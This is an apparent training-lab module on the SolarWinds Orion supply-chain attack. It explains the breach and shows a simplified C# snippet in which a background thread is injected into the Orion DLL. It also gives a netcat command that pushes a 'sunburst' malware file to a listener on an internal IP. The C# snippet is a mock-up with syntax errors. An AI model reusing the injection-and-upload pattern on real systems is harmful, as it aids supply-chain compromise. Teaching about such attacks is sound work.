                                    The SolarWinds hack, discovered in December 2020, was a sophisticated cyberattack targeting SolarWinds, a prominent IT management software company. Hackers, believed to be state-sponsored, inserted a malicious code into SolarWinds' Orion software updates, which were then distributed to thousands of SolarWinds customers, including numerous government agencies and major corporations. This backdoor allowed the attackers to infiltrate networks, steal sensitive data, and conduct espionage undetected for months. The breach raised significant concerns about the security of software supply chains and the vulnerability of critical infrastructure to cyber threats.

                                    Hackers infiltrated SolarWinds' software development environment and injected malicious code into the Orion software updates. This code was then unwittingly distributed to thousands of SolarWinds customers when they downloaded and installed updates for the Orion platform. The attackers meticulously crafted the malware to remain undetected, leveraging techniques such as code obfuscation and encryption, and even mimicking legitimate software behavior to evade detection by security measures. The compromised updates were signed with legitimate SolarWinds digital certificates, making it difficult to detect the malicious activity.

    <div id="terminalDescription" style="font-size: 16px; font-weight: normal; color: white;">In this lab, we are going to recreate a simplified version of solarwinds breach and how it was performed. The attackers injected malicious code into a .DLL file called SolarWinds.Orion.Core.BusinessLayer.dll, which they used to establish their backdoor connection.

Below is an example of what the SolarWinds.Orion.Core.BusinessLayer.dll file could have looked like, written in C#. The attackers obfuscated their code to appear as if it was performing normal business operations by keeping in line with the variable syntax style and naming conventions used by the original authors.
<code style="color: rgb(255, 215, 0);">
internal void RefreshInternal()
{
    if (Log.get_IsDebugEnabled())
    {
        Log.DebugFormat("Running scheduled backgroundInventory check on engine (0)", (object)engineID);
    }
    try
    {
        // Your code logic goes here
    }
    catch (Exception)
    {
        // Exception handling logic goes here
    }
    if (backgroundInventory.IsRunning)
    {
        Log.Info(object)"Skipping background backgroundInventory check, still running");
        return;
    }
    QueueInventoryTasksFromNodeSettings();
    QueueInventoryTasksFromInventorySettings();
    if (backgroundInventory.QueueSize > 0)
    {
        backgroundInventory.Start();
    }
}
</code>
<code style="color: rgb(255, 215, 0);">
If (!OrionImprovementBusinessLayer.IsAlive)
{
	Thread thread = new Thread(OrionImprovementBusinessLayer.Initialize);
	thread.IsBackground = true;
	thread.Start();
}
</code>
The objective of the attackers when editing the .dll file was to create a new thread that reached out to their outside server giving them backdoor access. This new thread could not interfere with the legitimate objective of the .dll so as to not draw suspicion. Remember, this is an extremely small piece of the file and injected code, and the real attack contained many many more lines to achieve this objective. Here, we are only reviewing a small piece

After backdoor access had been established, the attackers uploaded their SUNBURST malware which, once unknowingly signed and pushed to SolarWInds clients, would be activated and begin siphoning data out to the attackers before deleting itself from their systems. Let’s assume that the thread we added above was actually opening a netcat listener on port 63329 looking for our SUNBURST malware. On our outside server we can then upload our malware using this command:

<code style="color: rgb(255, 215, 0);">nc 192.168.1.100 63329 < sunburst.cs</code>

This is an oversimplified version, but hopefully this will provide a very basic understanding of how the attackers were able to communicate with their victims.

Use the <code style="color: rgb(255, 215, 0);">help-module3</code> command to explore available commands.
